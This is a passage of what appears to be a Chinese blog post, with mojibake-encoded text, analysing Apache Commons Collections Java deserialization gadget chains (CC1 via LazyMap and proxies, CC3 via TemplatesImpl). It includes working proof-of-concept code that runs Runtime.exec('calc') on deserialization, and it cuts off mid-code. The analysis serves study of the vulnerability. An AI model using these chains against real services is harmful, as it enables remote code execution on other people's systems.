class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line"><span class="comment">//        user.show();</span></span><br><span class="line">        <span class="comment">//é™æ€ä»£ç†</span></span><br><span class="line"><span class="comment">//        IUser userproxy = new UserProxy(user);</span></span><br><span class="line"><span class="comment">//        userproxy.show();</span></span><br><span class="line">        <span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line">        <span class="comment">//è¦ä»£ç†çš„æ¥å£ã€è¦åšçš„äº‹æƒ…ã€Classloaderç±»åŠ è½½å™¨</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">userinvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationHandler);</span><br><span class="line">        userproxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">UerImpl.java</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å±•ç¤º&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IUser.javaæ¥å£</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="é™æ€ä»£ç†ï¼š4">é™æ€ä»£ç†ï¼š4</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"><span class="comment">//é™æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;<span class="built_in">this</span>.user = user; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        user.show();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ¨æ€ä»£ç†ï¼š">åŠ¨æ€ä»£ç†ï¼š</h4><p>å¦‚æœè°ƒç”¨äº†åŠ¨æ€ä»£ç†ç±»çš„ä»»æ„æ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨åŠ¨æ€ä»£ç†ç±»ä¸­çš„invokeæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UserInvocationHanderler.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"><span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UserInvokcationä¸ºä»£ç†ç±»ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨çš„æ˜¯userï¼Œæ‰€ä»¥å°†userè¿™ä¸ªä»£ç†å¯¹è±¡ä¼ å…¥</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">userinvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line"><span class="comment">//ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ï¼š</span></span><br><span class="line"><span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader()<span class="comment">/*ç±»åŠ è½½å™¨*/</span>,user.getClass().getInterfaces()<span class="comment">/*è¦ä¼ å…¥çš„æ¥å£*/</span>,userinvocationHandler<span class="comment">/*è¦åšçš„äº‹æƒ…ï¼šä»£ç†userå¯¹è±¡*/</span>);</span><br><span class="line">userproxy.show();</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹å¼">åˆ©ç”¨æ–¹å¼:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡ï¼šB.f</span><br><span class="line">è°ƒç”¨é“¾ï¼šA[O] - &gt; O.abc - &gt; B.f</span><br><span class="line">Oä¸ºåŠ¨æ€ä»£ç†ç±»ï¼š</span><br><span class="line">O[B]invoke - &gt; f</span><br><span class="line"><span class="comment">//invoke - &gt; åœ¨æœ‰å‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//æ‹¼æ¥ä¸¤æ¡é“¾ï¼šä»»æ„-&gt;å›ºå®š</span></span><br></pre></td></tr></table></figure><p>åœ¨æŸ¥æ‰¾transformçš„ä½¿ç”¨æ—¶ï¼Œå‡ºäº†TransformedMapï¼Œè¿˜æœ‰LazyMapï¼Œæˆ‘ä»¬ç»§ç»­å°è¯•ä½¿ç”¨LazyMapæ„é€ ccé“¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192236604.png" alt="image-20240403192236604"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192255625.png" alt="image-20240403192255625"></p><p>è¿›å…¥LazyMap</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192502296.png" alt="image-20240403192502296"></p><p>å‘ç°æ˜¯åœ¨getæ–¹æ³•ä¸­è°ƒç”¨çš„transformï¼Œä¸”factoryæ˜¯å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬æŸ¥çœ‹æ„é€ æ–¹æ³•ï¼Œå‘ç°è¿˜æ˜¯ä¸€æ ·çš„è°ƒç”¨decorateå¯¹å…¶è¿›è¡Œèµ‹å€¼å°±è¡Œï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†getæ–¹æ³•ï¼Œè¿™é‡Œæ–¹æ³•ç‰¹åˆ«å¤šï¼Œæˆ‘ä»¬ç›´æ¥æ¥åˆ°è§¦å‘ç‚¹ï¼Œè¿˜æ˜¯AnnotationInvocationHandlerç±»ï¼Œä½†è¿™æ¬¡æ˜¯invokeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403192806351.png" alt="image-20240403192806351"></p><p>å‘ç°å‚æ•°ä¾ç„¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåªæ˜¯æœ‰ifåˆ¤æ–­éœ€è¦æˆ‘ä»¬è¿›è¡Œç»•è¿‡ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸èƒ½è°ƒç”¨equalsæ–¹æ³•ï¼Œä¸”è°ƒç”¨çš„ä¸èƒ½æ˜¯æœ‰å‚æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬çš„readObjectæ­£å¥½æœ‰æ— å‚æ–¹æ³•ï¼Œä¸”ç±»åæ˜¯å¯æ§çš„ï¼Œå¦‚ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403193035325.png" alt="image-20240403193035325"></p><h3 id="POC2">POC2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å› ä¸ºInvocationHandleræ¥æ”¶çš„æ˜¯maoï¼Œæ‰€ä»¥è¿™é‡Œä»£ç†çš„ç±»å‹ä¹Ÿå¾—æ˜¯mapï¼Œæƒ³è°ƒç”¨hçš„invokeï¼Œå°±åƒä¸‹è¾¹è¿™ä¹ˆå†™å°±è¡Œï¼Œå…·ä½“çš„æˆ‘è¿˜ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»§ç»­å®ä¾‹åŒ–ä¸€ä¸ªInvocationHandleræ¥æ¥æ”¶map</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC3">CC3</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>CC3å…¶å®å°±æ˜¯ç”¨InvokerTransformerè°ƒç”¨äº†tpé“¾ï¼Œç”±äºåœ¨fj1.2.24çš„æ—¶å€™å·²ç»äº†è§£è¿‡äº†è¿™æ¡é“¾å­ï¼Œä¸‹é¢æˆ‘å°±ç®€å•è¯´è¯´ï¼Œå…·ä½“çš„å¯ä»¥å»çœ‹fj1.2.24çš„åšå®¢</p><p>è¿™æ¡é“¾å­ä¸»è¦æ˜¯é€šè¿‡åŠ è½½å­—èŠ‚ç è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œé€šè¿‡InvokerTransformerçš„ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ‰§è¡Œåˆ°TemplatesImplçš„newTransformeræ–¹æ³•è¿›è€ŒåŠ è½½æ¶æ„ç±»æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¸‹é¢æ˜¯è¯¦ç»†åˆ†æ</p><h3 id="TemplatesImpl">TemplatesImpl</h3><p>æˆ‘é—·å…ˆæ¥åˆ°æ¼æ´è§¦å‘ç‚¹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404194527541.png" alt="image-20240404194527541"></p><p>å‘ç°è¿™é‡Œå°†_class[_transletIndex]è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¿›è¡Œä»»æ„ä»£ç çš„æ‰§è¡Œï¼Œç”±äºä¸æ˜¯publicç”¨æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å‘ä¸Šæ‰¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404194937317.png" alt="image-20240404194937317"></p><p>äºæ˜¯å°±æ‰¾åˆ°äº†newTransformerè¿™ä¸ªæ–¹æ³•ï¼Œæ—¢ç„¶å·²ç»æ‰¾åˆ°äº†å¯ä»¥è°ƒç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±ç»§ç»­å®Œå–„è°ƒç”¨æ¡ä»¶å³å¯ï¼Œå›åˆ°getTransletInstanceï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†classèµ‹å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ç±»æ‰èƒ½è¿›è¡Œæ“ä½œ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404195317785.png" alt="image-20240404195317785"></p><p>æ‰€ä»¥æˆ‘ä»¬ç»§ç»­è·Ÿè¿›defineTransletClassesæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404200502690.png" alt="image-20240404200502690"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸‰ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯_bytecodesä¸èƒ½ä¸ºç©ºï¼Œå†å°±æ˜¯è¿™é‡Œ_class[i] = loader.defineClass(_bytecodes[i]);è¿›è¡Œäº†ç±»åŠ è½½æ“ä½œï¼Œè¿˜æœ‰ä¸€ä¸ªæ²¡æ ‡ï¼Œå°±æ˜¯å›¾ä¸­çš„_tfactoryä¹Ÿå¾—èµ‹å€¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæœ€ä¸‹é¢é‚£ä¸ªå°±æ˜¯è¦æ±‚æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»æ˜¯ABSTRACT_TRANSLETï¼Œå¦åˆ™ä¼šæŠ¥å¼‚å¸¸ï¼Œå…·ä½“å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404200814491.png" alt="image-20240404200814491"></p><p>ä¹Ÿå°±æ˜¯AbstractTransletè¿™ä¸ªç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404201054434.png" alt="image-20240404201054434"></p><p>ç”±äºæˆ‘ä»¬ä¼ å…¥çš„byteæ˜¯äºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æœ€ç»ˆçš„_transletIndexå°±ä¼šæ˜¯1ï¼Œè¿›è€Œå®ä¾‹åŒ–æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œæœ€ååªéœ€è¦å°†CC1ä¸­chainedtransformsçš„è°ƒç”¨æ¢æˆTemplatesImplçš„newTransformerå³å¯</p><h3 id="POC1">POC1</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span 